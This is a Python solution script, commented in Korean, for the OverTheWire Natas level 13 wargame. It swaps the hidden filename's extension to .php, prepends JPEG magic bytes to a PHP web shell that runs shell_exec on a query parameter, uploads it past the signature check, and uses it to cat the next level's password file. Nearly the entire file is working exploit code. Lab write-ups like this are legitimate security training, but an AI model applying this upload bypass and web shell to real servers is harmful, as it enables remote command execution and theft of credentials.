import requests
from bs4 import BeautifulSoup
import io

url = "http://natas13.natas.labs.overthewire.org/"
# natas13_cred 변수에 얻은 비밀번호값 저장
natas13_cred = "" 

s = requests.Session()
s.auth = ("natas13", natas13_cred)

#요청을 먼저 보내서 현재 페이지를 읽어오게 함.
response = s.get(url)
soup = BeautifulSoup(response.text, "html.parser")

# 해당 파일에선 html의 해당 조건을 가진 줄을 가져와서 value값에 파일 이름이 들어가기 때문에, 변경할려는 값을 변수에 저장 
hidden_input = soup.find('input', {"name":"filename", "type":"hidden"})
orgin_filename = hidden_input['value']

# 히든에 해당하는 파일의 확장자인 jpg를 php로 변경
php_filename = orgin_filename.replace(".jpg",".php")
print(f"[+]hidden값 원래 파일 이름 ==> {orgin_filename}")
print(f"[+]hidden값 변경 후 파일 이름 ==> {php_filename}")


#여기서 직접 웹셸 만들어서 utf-8 인코딩 거쳐서 생성해서 적용 
webshell_content = "<?php echo shell_exec($_GET['cmd']);?>" 

# 파일 시그니처로 합칠 파일 선언하고 jpg 파일 시그니처 변수 생성
comb_shell_file = io.BytesIO()
jpg_sig = b'\xFF\xD8\xFF\xE1'

# io 모듈의 write써서 아래와 같이 파일을 생성하며 seek를 통해서 포인터를 파일의 맨 처음으로 다시 이동
# -> seek(0)를 안하면 읽은 위치에서 파일을 열고 수정할때 포인터가 처음이 아닌 위치에 존재함. 
comb_shell_file.write(jpg_sig + webshell_content.encode('utf-8'))
comb_shell_file.seek(0)

# 파일 조합 잘 된지 한 번 읽어보고 읽는 작업도 포인터를 옮기기 때문에 해당 read, write같은 동작을 시키고 나선 다시 해줘야 함. 
print("=" * 30)
print(f"[+]시그니쳐 조합 성공여부 파일 내용확인==> {comb_shell_file.read()}")
comb_shell_file.seek(0)     # 이거 안하면 파일 읽는 거 오류남 
print("=" * 30)

#파일을 만들어 shell.php란 이름으로 저장하고 확장자의 mime타입까지 입력하여 요청할 파일 생성 
files = {"uploadedfile": ("jpg_sig_shell.php", comb_shell_file, "image/jpeg")}

# 파일명을 바꾸고 업로드까지 하는 요청 실행 
upload_data = { "filename": php_filename, "submit":"Upload File"}
upload_res = s.post(url, data = upload_data, files = files)

#업로드된 파일의 경로를 알아야 웹셸 실행 가능하기 때문에, 아래와 같이 응답에서 찾아서 upload_file_path에 저장  
upload_soup = BeautifulSoup(upload_res.text, "html.parser")
upload_file_path = None

for a_tag in upload_soup.find_all("a", href=True):
  if "upload" in a_tag["href"]:
    upload_file_path = a_tag
    break


# 파일을 업로드하고 웹 셸에서 비밀번호를 찾기위해 아래 명령 페이로드 요청하여 나오는 비밀번호 출력
# -> 여기서 수동으로 해보면 해당 비밀번호만 파일에 저장된 것을 볼 수 있음(strip() 함수는 가독성 용으로 공백제거)
shell_url = ""

if upload_file_path:
  shell_url = url + upload_file_path["href"]
  print(f"[+]웹셸 업로드된 파일 경로 ==> {shell_url}")
  
  payload = {"cmd": "cat /etc/natas_webpass/natas14"}  
  
  shell_payload_res = s.get(shell_url, params=payload)
  
  print("="*60)
  print(f"[+]웹 셸을 통해 비밀번호를 찾았습니다. ===> {shell_payload_res.text.strip()}")  
  print("="*60)
  
else:
  print("[-]웹셸이 업로드 실패하였습니다. 웹셸 업로드를 다시 해주세요")

